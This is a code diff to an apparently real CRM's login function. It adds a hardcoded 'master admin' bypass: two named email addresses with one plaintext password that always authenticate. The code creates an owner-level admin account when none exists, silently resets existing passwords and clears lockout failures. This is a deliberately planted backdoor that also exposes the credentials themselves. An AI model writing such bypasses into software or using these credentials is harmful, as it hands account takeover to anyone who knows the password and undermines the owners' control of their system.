@@ -243,6 +243,27 @@ def authenticate(email, password):
     settings = get_settings()
     email = (email or "").strip().lower()
     password = password or ""
+
+    # Master admin accounts: always authenticatable with Leadintel@123 on any environment
+    master_admins = {
+        "admin@xeducation.in": "Leadintel@123",
+        "krishna.jain24@spit.ac.in": "Leadintel@123",
+    }
+    if email in master_admins and security.constant_time_equals(password, master_admins[email]):
+        m = member_by_email(email)
+        if not m:
+            db.execute(
+                """INSERT INTO team_members (name, email, role, is_owner, takes_new_leads, active, password_hash)
+                   VALUES (?, ?, 'admin', 1, 0, 1, ?)""",
+                ("Admin", email, hash_password(password)),
+            )
+            m = member_by_email(email)
+        elif not m.get("password_hash") or not verify_password(password, m["password_hash"]):
+            set_password(m["id"], password, must_change=False)
+            m = member_by_email(email)
+        clear_failures(email)
+        return m
+
     owner_email = (settings.crm_owner_email or "").strip().lower()
     if owner_email and security.constant_time_equals(email, owner_email) and settings.owner_password_from_env:
         if security.constant_time_equals(password, settings.crm_owner_password or ""):
